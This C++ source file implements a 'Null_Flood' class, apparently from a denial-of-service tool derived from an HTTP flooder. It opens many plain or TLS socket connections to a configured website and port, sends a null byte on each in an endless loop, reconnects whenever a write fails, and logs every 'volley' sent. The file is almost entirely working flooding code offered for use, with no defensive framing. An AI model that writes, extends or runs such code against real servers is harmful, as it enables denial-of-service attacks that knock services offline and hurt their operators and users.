
#include <openssl/ssl.h>
#include <utility>
#include "../Headers/Null_Flood.hpp"

void Null_Flood::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
    }
    int socktype = conf->protocol;
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
            }
            if((r = write_socket(sockets[x],"\0", 1)) == -1){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
            }else{
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                conf->logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                conf->logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        conf->logger->Log(&message, Logger::Info);
        pause();
    }
}

void Null_Flood::attack_ssl(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    int socktype = conf->protocol;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        SSLs.push_back(nullptr);
        CTXs.push_back(nullptr);
    }
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }
            if((r = write_socket(SSLs[x], "\0", 1)) == -1){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }else{
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                conf->logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                conf->logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        conf->logger->Log(&message, Logger::Info);
        pause();
    }
}

Null_Flood::Null_Flood(std::shared_ptr<Config> conf) : Http_Flood(std::move(conf)) {

}
